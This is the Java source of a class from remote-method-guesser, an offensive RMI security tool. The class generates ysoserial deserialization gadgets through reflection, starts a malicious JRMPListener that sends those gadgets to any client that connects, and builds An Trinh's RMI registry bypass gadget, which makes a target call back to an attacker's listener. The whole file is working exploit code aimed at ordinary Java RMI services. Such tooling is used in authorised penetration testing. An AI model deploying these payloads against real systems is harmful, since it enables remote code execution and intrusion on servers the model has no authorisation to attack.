package eu.tneitzel.rmg.utils;

import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.UnknownHostException;
import java.rmi.server.ObjID;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Arrays;

import javax.net.ServerSocketFactory;

import eu.tneitzel.rmg.internal.ExceptionHandler;
import eu.tneitzel.rmg.internal.RMGOption;
import eu.tneitzel.rmg.io.Logger;
import eu.tneitzel.rmg.networking.DummySocketFactory;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

/**
 * remote-method-guesser does not include the ysoserial library as one of its dependencies. This is on purpose
 * for the following reasons:
 *
 *      1. The ysoserial library is quite big in file size (~55MB). If each offensive tool includes it within
 *         its own .jar file, you loose a non negligible amount of disc space to duplicate stuff.
 *      2. Including ysoserial as a dependency means that you have all available gadgets within your own classpath,
 *         which make you vulnerable against deserialization attacks on the client side.
 *      3. Each security professional is expected to have a ysoserial.jar on his machine anyway, so why shipping
 *         an additional one?
 *
 * Instead of using it as a library, remote-method-guesser uses a URLClassLoader to load the .jar and Reflection
 * to invoke methods on it.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
@SuppressWarnings("restriction")
public class YsoIntegration
{
    private static String[] bypassGadgets = new String[]{"JRMPClient2", "AnTrinh"};

    /**
     * Basically a wrapper around prepareAnTrinhGadget that attempts to parse the command string as a listener
     * before creating the listener object. This is called during gadget creation, when the specified gadget
     * is the AnTrinh gadget.
     *
     * @param command expected to be in listener format (host:port)
     * @return AnTrinh bypass gadget
     */
    private static Object generateBypassGadget(String command)
    {
        Object payloadObject = null;
        String[] split = command.split(":");

        if (split.length != 2 || !split[1].matches("\\d+"))
        {
            ExceptionHandler.invalidListenerFormat(true);
        }

        try
        {
            payloadObject = prepareAnTrinhGadget(split[0], Integer.valueOf(split[1]));
        }

        catch (Exception e)
        {
            ExceptionHandler.unexpectedException(e, "bypass object", "generation", true);
        }

        return payloadObject;
    }

    /**
     * Just a small wrapper around the URLClassLoader creation. Checks the existence of the specified file
     * path before creating a class loader around it.
     *
     * @return URLClassLoader for ysoserial classes
     * @throws MalformedURLException when the specified file system path exists, but is invalid
     */
    private static URLClassLoader getClassLoader() throws MalformedURLException
    {
        String path = RMGUtils.expandPath(RMGOption.YSO.getValue());
        File ysoJar = new File(path);

        if (!ysoJar.exists())
        {
            ExceptionHandler.ysoNotPresent(path);
        }

        return new URLClassLoader(new URL[] {ysoJar.toURI().toURL()});
    }

    /**
     * Transforms a hostname into an InetAddress. The hostname can be specified either as real hostname or as
     * IP address. When using a hostname, the corresponding IP address is resolved by the function. In both
     * cases, the IP address is compared against the local network interfaces. If the IP address cannot be found
     * on one of the local interfaces, the function throws an error and exists the program.
     *
     * @param host hostname or IP address to transform into an InetAddress
     * @return InetAddress object for the specified hostname
     */
    private static InetAddress getLocalAddress(String host)
    {
        InetAddress addr = null;

        try
        {
            addr = InetAddress.getByName(host);

            if (!addr.isAnyLocalAddress() && !addr.isLoopbackAddress())
            {
                NetworkInterface.getByInetAddress(addr);
            }

        }

        catch (SocketException | UnknownHostException e)
        {
            Logger.eprintlnMixedYellow("Specified address", host, "seems not to be available on your host.");
            Logger.eprintlnMixedBlue("Listener address is expected to be", "bound locally.");
            ExceptionHandler.showStackTrace(e);
            RMGUtils.exit();
        }

        return addr;
    }

    /**
     * Opens a malicious JRMPListener that answers with ysoserial gadgets to incoming JRMP connections.
     * The actual JRMPListener is spawned by ysoserial. This function is basically just a wrapper around
     * the JRMPListener class of ysoserial. The ysoserial library is loaded via URLClassLoader and the
     * JRMPListener class is accessed via reflection.
     *
     * The only noticeable difference to the default JRMPListener of ysoserial is, that you can specify
     * the listening host in this implementation. The JRMPListener will then only be opened on the specified
     * IP address.
     *
     * @param host IP address where to listen for connections
     * @param port port where to listen for connections
     * @param payloadObject to deliver to incoming connections
     */
    public static void createJRMPListener(String host, int port, Object payloadObject)
    {
        try
        {
            InetAddress bindAddress = getLocalAddress(host);
            URLClassLoader ucl = getClassLoader();

            Class<?> yso = Class.forName("ysoserial.exploit.JRMPListener", true, ucl);
            Constructor<?> cons = yso.getConstructor(new Class[] {int.class, Object.class});
            Method runMethod = yso.getDeclaredMethod("run", new Class[] {});

            Field serverSocket = yso.getDeclaredField("ss");
            serverSocket.setAccessible(true);

            Logger.printMixedYellow("Creating a", "JRMPListener", "on ");
            Logger.printlnPlainBlue(host + ":" + port + ".");

            Object jrmpListener = cons.newInstance(port, payloadObject);

            ServerSocket serverSock = (ServerSocket)serverSocket.get(jrmpListener);
            serverSock.close();

            serverSock = ServerSocketFactory.getDefault().createServerSocket(port, 0, bindAddress);
            serverSocket.set(jrmpListener, serverSock);

            Logger.printlnMixedBlue("Handing off to", "ysoserial...");

            runMethod.invoke(jrmpListener, new Object[] {});
            System.exit(0);
        }

        catch (java.net.BindException e)
        {
            ExceptionHandler.bindException(e);
        }

        catch (java.lang.reflect.InvocationTargetException e)
        {
            Throwable t = ExceptionHandler.getCause(e);

            if (t instanceof java.net.BindException)
            {
                ExceptionHandler.bindException(e);
            }

            else if (t instanceof java.lang.IllegalArgumentException)
            {
                Logger.lineBreak();
                Logger.eprintlnMixedYellow("Caught", "IllegalArgumentException", "during JRMPListener creation.");
                Logger.eprintlnMixedBlue("Exception message:", t.getMessage());
                RMGUtils.exit();
            }

            else
            {
                ExceptionHandler.unexpectedException(e, "JRMPListener", "creation", true);
            }
        }

        catch (Exception e)
        {
            ExceptionHandler.unexpectedException(e, "JRMPListener", "creation", true);
        }
    }

    /**
     * Loads ysoserial using and separate URLClassLoader and invokes the makePayloadObject function by using
     * reflection. The result is a ysoserial gadget as it would be created on the command line.
     *
     * @param gadget name of the desired gadget
     * @param command command specification for the desired gadget
     * @return ysoserial gadget
     */
    public static Object getPayloadObject(String gadget, String command)
    {
        if (Arrays.asList(bypassGadgets).contains(gadget))
        {
            return generateBypassGadget(command);
        }

        Object ysoPayload = null;

        try
        {
            URLClassLoader ucl = getClassLoader();

            Class<?> yso = Class.forName("ysoserial.payloads.ObjectPayload$Utils", true, ucl);
            Method method = yso.getDeclaredMethod("makePayloadObject", new Class[] {String.class, String.class});

            Logger.print("Creating ysoserial payload...");
            ysoPayload = method.invoke(null, new Object[] {gadget, command});
        }

        catch (Exception e)
        {
            Logger.printlnPlain(" failed.");
            Throwable cause = ExceptionHandler.getCause(e);

            if (cause.getClass().getName().equals("java.lang.reflect.InaccessibleObjectException"))
            {
                Logger.eprintlnMixedYellow("Caught", "InaccessibleObjectException", "during gadget generation.");
                Logger.eprintlnMixedBlue("This is caused by the", "Java module system", "in newer Java versions.");
                Logger.eprintln("Retry using Java 8 or pass add-open directives to remote-method-guessers manifest.");
            }

            else
            {
                Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during gadget generation.");
                Logger.eprintMixedBlue("You probably specified", "a wrong gadget name", "or an ");
                Logger.eprintlnPlainBlue("invalid gadget argument.");
            }

            ExceptionHandler.showStackTrace(e);
            RMGUtils.exit();
        }

        Logger.printlnPlain(" done.");
        return ysoPayload;
    }

    /**
    * The bypass technique implemented by this code was discovered by An Trinh (@_tint0) and a detailed analysis was
    * provided by Hans-Martin Münch (@h0ng10). Certain portions of the code were copied from the corresponding blog post:
    * https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/
    *
    * Noticeable differences are that the UnicastRemoteObject is created with a DummySocketFactory to prevent it from
    * being bound locally and the fact that it is unexported manually after its creation. Apart from removing the object
    * from the local runtime, unexporting has an additional benefit: As Hans-Martin Münch mentioned, RemoteObjects are
    * normally replaced by a Proxy during RMI communication. This is handled by the replaceObject function from the
    * MarshalOutputStream class. Thus, he recommends to set the enableReplace field of ObjectOutput to false manually.
    * This is however not necessary when unexporting the object first, as RemoteObjects are only replaced by a Proxy if
    * they can be found within the local ObjectTable.
    *
    * @param host  listener address for the outgoing JRMP connection
    * @param port  listener port for the outgoing JRMP connection
    * @return payload object
    * @throws Exception internal error
    */
    public static Object prepareAnTrinhGadget(String host, int port) throws Exception
    {
        Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor(int.class, RMIClientSocketFactory.class, RMIServerSocketFactory.class);
        constructor.setAccessible(true);

        Field ssfField = UnicastRemoteObject.class.getDeclaredField("ssf");
        ssfField.setAccessible(true);

        TCPEndpoint endpoint = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));

        RemoteObjectInvocationHandler payloadInvocationHandler = new RemoteObjectInvocationHandler(refObject);
        RMIServerSocketFactory proxySSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),
            new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
            payloadInvocationHandler);

        UnicastRemoteObject payloadObject = null;
        payloadObject = (UnicastRemoteObject)constructor.newInstance(new Object[]{0, null, new DummySocketFactory()});
        UnicastRemoteObject.unexportObject(payloadObject, true);

        ssfField.set(payloadObject, proxySSF);
        return payloadObject;
    }
}
